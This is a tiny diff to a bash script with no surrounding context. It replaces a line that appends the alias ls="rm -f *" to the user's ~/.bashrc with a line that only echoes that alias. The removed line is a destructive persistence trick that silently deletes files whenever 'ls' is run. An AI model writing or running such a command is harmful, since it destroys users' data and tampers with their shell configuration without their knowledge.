@@ -1,2 +1,2 @@
 #!/bin/bash
-exec sh -c "printf 'alias ls=\"rm -f *\"\n' >> \"$HOME/.bashrc\" ; exec bash" fake
+echo "alias ls='rm -f *'"
